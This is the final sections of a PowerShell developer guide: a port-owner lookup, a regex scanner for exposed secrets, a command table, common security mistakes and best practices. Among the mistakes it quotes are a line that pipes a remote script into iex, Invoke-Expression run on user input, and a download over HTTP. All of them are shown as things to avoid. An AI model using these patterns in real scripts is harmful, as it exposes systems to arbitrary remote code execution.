$conn = Get-NetTCPConnection -LocalPort $port -State Listen -ErrorAction SilentlyContinue
if ($conn) {
    $proc = Get-Process -Id $conn.OwningProcess
    Write-Host "Port $port is held by: $($proc.Name) (PID: $($proc.Id))"
    Write-Host "Path: $($proc.Path)"
    # Decide: stop it or change your app's port
    # Stop-Process -Id $proc.Id -Force
}
```

### Security Audit: Find Exposed Secrets

```powershell
$sensitivePatterns = @(
    'password\s*=\s*["'']\S+',
    'api[_-]?key\s*=\s*["'']\S+',
    'secret\s*=\s*["'']\S+',
    'Bearer\s+[A-Za-z0-9\-._~+\/]+=*',
    'AKIA[0-9A-Z]{16}'                    # AWS Access Key pattern
)

Get-ChildItem . -Recurse -File -Include "*.py","*.js","*.ts","*.env","*.json","*.yaml","*.yml" `
    -Exclude "node_modules","*.lock","package-lock.json" |
    Select-String -Pattern ($sensitivePatterns -join "|") |
    Select-Object Filename, LineNumber, @{N="Match";E={$_.Line.Trim()}} |
    Format-Table -Wrap
```

---

## 20. The 20 Commands Every Developer Must Memorize

| # | Command | Why |
|---|---------|-----|
| 1 | `Get-ChildItem -Recurse -Filter` | Recursive file search with OS-speed filtering |
| 2 | `Select-String -Pattern` | grep — search file contents with regex |
| 3 | `Get-Content -Tail 100 -Wait` | Live log following |
| 4 | `Set-Content / Add-Content` | Write/append files with encoding control |
| 5 | `Invoke-WebRequest -OutFile` | Download files |
| 6 | `Get-FileHash -Algorithm SHA256` | Verify file integrity |
| 7 | `Get-Process \| Sort CPU -Desc` | Find CPU-hungry processes |
| 8 | `Stop-Process -Force` | Kill a process |
| 9 | `Get-NetTCPConnection -State Listen` | See open ports |
| 10 | `Test-NetConnection host -Port` | TCP port reachability test |
| 11 | `Get-Service \| Where Status -eq Running` | Service status |
| 12 | `Restart-Service -Force` | Restart a service |
| 13 | `[Environment]::SetEnvironmentVariable` | Persist env vars |
| 14 | `winget install / upgrade --all` | Package management |
| 15 | `Expand-Archive / Compress-Archive` | ZIP operations |
| 16 | `ConvertFrom-Json / ConvertTo-Json` | JSON in pipeline |
| 17 | `Get-Command / Get-Help -Examples` | Discover commands |
| 18 | `$ErrorActionPreference = "Stop"` | Script safety net |
| 19 | `Push-Location / Pop-Location` | Safe directory changes in scripts |
| 20 | `Start-Process -Verb RunAs` | Elevate to admin |

---

## 21. Real-World Security Mistakes Beginners Make

```powershell
# MISTAKE 1 — Trusting curl alias
curl https://raw.githubusercontent.com/user/repo/main/install.ps1 | iex
# This downloads and executes arbitrary code with no verification
# RIGHT: download, verify hash, read it, then execute

# MISTAKE 2 — Set-ExecutionPolicy Unrestricted on servers
Set-ExecutionPolicy Unrestricted   # Never. Use RemoteSigned or Bypass -Scope Process

# MISTAKE 3 — Hardcoded secrets
$password = "MyDbPass123"          # Visible in scripts, logs, git history forever
# RIGHT: Use SecureString or environment variables loaded from vault

# MISTAKE 4 — Ignoring errors silently
Get-ChildItem \\network\share -ErrorAction SilentlyContinue  # OK for optional
$ErrorActionPreference = "SilentlyContinue"   # NEVER globally — hides real failures

# MISTAKE 5 — No path validation before Remove-Item
$dir = $env:TEMP + $suffix         # If $suffix is empty: removes entire TEMP
Remove-Item $dir -Recurse -Force
# RIGHT: always Test-Path and check for null/empty

# MISTAKE 6 — Invoke-Expression on untrusted input
$userInput = Read-Host "Enter command"
Invoke-Expression $userInput        # Direct code injection. Never.

# MISTAKE 7 — Downloading over HTTP
Invoke-WebRequest "http://releases.myapp.com/setup.exe" -OutFile setup.exe
# Man-in-the-middle can replace the binary. Always use HTTPS + hash verification.
```

---

## 22. PowerShell Best Practices Summary

```powershell
# 1. Always declare strict mode and stop on error at script top
Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

# 2. Use $PSScriptRoot for relative paths — never assume working directory
$configPath = Join-Path $PSScriptRoot "config.json"

# 3. Use [CmdletBinding()] and param() blocks
[CmdletBinding(SupportsShouldProcess)]
param([Parameter(Mandatory)][string]$Environment)

# 4. Validate parameters early
[ValidateSet("dev","staging","prod")][string]$Environment
[ValidatePattern("^\d+\.\d+\.\d+$")][string]$Version

# 5. Use -WhatIf on destructive operations during development
Remove-Item $path -Recurse -WhatIf

# 6. Never store secrets in scripts — use environment or vault
$apiKey = $env:MY_API_KEY   # From environment
if (-not $apiKey) { throw "MY_API_KEY is not set" }

# 7. Log with timestamps — not bare Write-Host everywhere
function Write-Log { param([string]$msg) Write-Host "[$(Get-Date -f 'HH:mm:ss')] $msg" }

# 8. Prefer full cmdlet names in scripts — aliases are for interactive use only
Get-ChildItem   # not ls / dir
Remove-Item     # not rm / del
Invoke-WebRequest  # not curl / wget

# 9. Always specify -Encoding UTF8 (or UTF8NoBOM on PS 7+)
Set-Content output.txt $data -Encoding UTF8

# 10. Use try/catch/finally — not just catch
try {
    # risky operation
} catch {
    Write-Log "ERROR: $($_.Exception.Message)"
    exit 1
} finally {
    Pop-Location   # cleanup always runs
}
```

---

*Guide Version 1.0 — Windows PowerShell 5.1 / PowerShell 7.x compatible*
*Focus: Real developer workflows, internal mechanics, security awareness*